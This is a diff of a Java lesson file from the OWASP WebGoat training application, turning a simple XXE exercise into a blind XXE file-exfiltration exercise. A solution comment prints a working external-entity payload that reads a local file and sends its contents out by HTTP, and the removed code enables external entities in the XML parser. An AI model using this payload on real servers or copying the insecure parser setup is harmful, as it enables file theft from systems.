@@ -1,6 +1,6 @@
 package org.owasp.webgoat.plugin;
 
-import org.apache.commons.exec.OS;
+import org.apache.commons.lang.exception.ExceptionUtils;
 import org.owasp.webgoat.lessons.Assignment;
 import org.owasp.webgoat.lessons.model.AttackResult;
 import org.springframework.http.MediaType;
@@ -9,11 +9,12 @@ import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.ResponseBody;
 
-import javax.xml.bind.JAXBContext;
-import javax.xml.bind.Unmarshaller;
-import javax.xml.stream.XMLInputFactory;
-import javax.xml.stream.XMLStreamReader;
-import java.io.StringReader;
+import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.List;
+
+import static org.owasp.webgoat.plugin.SimpleXXE.parseXml;
 
 /**
  * ************************************************************************************************
@@ -42,54 +43,66 @@ import java.io.StringReader;
  *
  * @author nbaars
  * @version $Id: $Id
- * @since November 17, 2016
+ * @since November 18, 2016
  */
-public class SimpleXXE extends Assignment {
-
-    private final static String[] DEFAULT_LINUX_DIRECTORIES = {"usr", "opt", "var"};
-    private final static String[] DEFAULT_WINDOWS_DIRECTORIES = {"Windows", "Program Files (x86)", "Program Files"};
+public class BlindSendFileAssignment extends Assignment {
 
     @Override
     public String getPath() {
-        return "XXE/simple";
+        return "XXE/blind";
     }
 
     @RequestMapping(method = RequestMethod.POST, consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
     @ResponseBody
     public AttackResult createNewUser(@RequestBody String userInfo) throws Exception {
-        User user = parseXml(userInfo);
-        if (checkSolution(user)) {
-          return AttackResult.success("Congratulation", String.format("Welcome %s you can now login to our website", user.getUsername()));
+        String error = "";
+        try {
+            parseXml(userInfo);
+        } catch (Exception e) {
+            error = ExceptionUtils.getFullStackTrace(e);
         }
-        if (userInfo.contains("<!DOCTYPE")) {
-            return AttackResult.failed("Try again you did include a doctype in the xml!");
+
+        File logFile = new File(getPluginDirectory(), "plugin/XXE/");
+        List<String> lines = Files.readAllLines(Paths.get(logFile.toURI()));
+        boolean solved = lines.stream().filter(l -> l.contains("WebGoat 8 rocks...")).findFirst().isPresent();
+        if (solved) {
+            return AttackResult.success();
         } else {
-            return AttackResult.failed(String.format("Welcome %s you can now login to our website", user.getUsername()));
+            return AttackResult.failed("Try again...", error);
         }
     }
 
-    public static User parseXml(String xml) throws Exception {
-        JAXBContext jc = JAXBContext.newInstance(User.class);
-
-        XMLInputFactory xif = XMLInputFactory.newFactory();
-        xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
-        xif.setProperty(XMLInputFactory.IS_VALIDATING, false);
-
-        xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
-        XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(xml));
-
-        Unmarshaller unmarshaller = jc.createUnmarshaller();
-        return (User) unmarshaller.unmarshal(xsr);
-    }
-
-    public static boolean checkSolution(User userInfo) {
-        String[] directoriesToCheck = OS.isFamilyUnix() ? DEFAULT_LINUX_DIRECTORIES : DEFAULT_WINDOWS_DIRECTORIES;
-        boolean success = true;
-        for (String directory : directoriesToCheck) {
-            success &= userInfo.getUsername().contains(directory);
-        }
-        return success;
-    }
-
-
+    /**
+     * Solution:
+     *
+     * Create DTD:
+     *
+     * <pre>
+     *     <?xml version="1.0" encoding="UTF-8"?>
+     *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
+     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=%file;'>">
+     *      %all;
+     * </pre>
+     *
+     * This will be reduced to:
+     *
+     * <pre>
+     *     <!ENTITY send SYSTEM 'http://localhost:8080/WebGoat/XXE/ping?text=[contents_file]'>
+     * </pre>
+     *
+     * Wire it all up in the xml send to the server:
+     *
+     * <pre>
+     *  <?xml version="1.0"?>
+     *  <!DOCTYPE root [
+     *  <!ENTITY % remote SYSTEM "http://localhost:8080/WebGoat/plugin_lessons/plugin/XXE/test.dtd">
+     *  %remote;
+     *   ]>
+     *  <user>
+     *    <username>test&send;</username>
+     *  </user>
+     *
+     * </pre>
+     *
+     */
 }
